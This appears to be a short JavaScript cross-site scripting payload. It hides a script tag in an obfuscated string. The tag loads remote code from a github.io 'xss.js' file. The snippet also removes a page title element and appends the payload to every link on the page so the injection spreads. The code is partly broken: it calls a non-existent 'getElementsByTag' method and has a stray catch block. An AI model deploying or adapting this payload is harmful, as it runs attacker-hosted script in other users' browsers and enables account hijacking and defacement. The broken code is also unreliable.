let grab = "<script>d=document;a=d['create'['concat']('Element')]('script');a['src']='//wyattbluezgithubzio/xsszjs'['split']('z')['join'](String(1/2)[1]);d['body']['append'['concat']('Child')](a)</script>";

console.log('working');

try {
	document.getElementsByClassName('aka-title')[0].outerHTML="";
} catch(e){}

let spans = document.getElementsByTag('a');
let len = spans.length;
for(let i=len-1; i>=0; i--){
	let item = spans[i];
	item.href+= "?from=Main."+grab;
}	

catch(e){}
